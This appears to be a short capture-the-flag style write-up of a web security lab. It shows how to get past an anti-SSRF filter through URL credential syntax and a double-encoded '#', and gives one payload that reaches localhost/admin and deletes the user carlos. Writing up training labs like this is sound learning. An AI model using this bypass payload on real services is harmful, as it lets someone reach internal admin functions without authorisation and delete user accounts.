### Fourth Exercise 👻


![problem.PNG](/assets/SSRF/Fourth/problem.PNG)

#### **To do**
```
To solve the lab, change the stock check URL to access the admin interface at http://localhost/admin and delete the user carlos.

The developer has deployed an anti-SSRF defense you will need to bypass.  
```



1. You can login directly in the url with `https://username:password@[url]`

2. Search directly in url with character `#`. Ex.

![explanation.PNG](/assets/SSRF/Fourth/explanation.PNG)]



3. Try with this to access **Admin Panel** and **delete user carlos**
```bash
http://localhost%2523@stock.weliketoshop.net:8080/admin/delete?username=carlos
```

* `%2523` -> Is the result to encod two times character **#**


You solve the lab!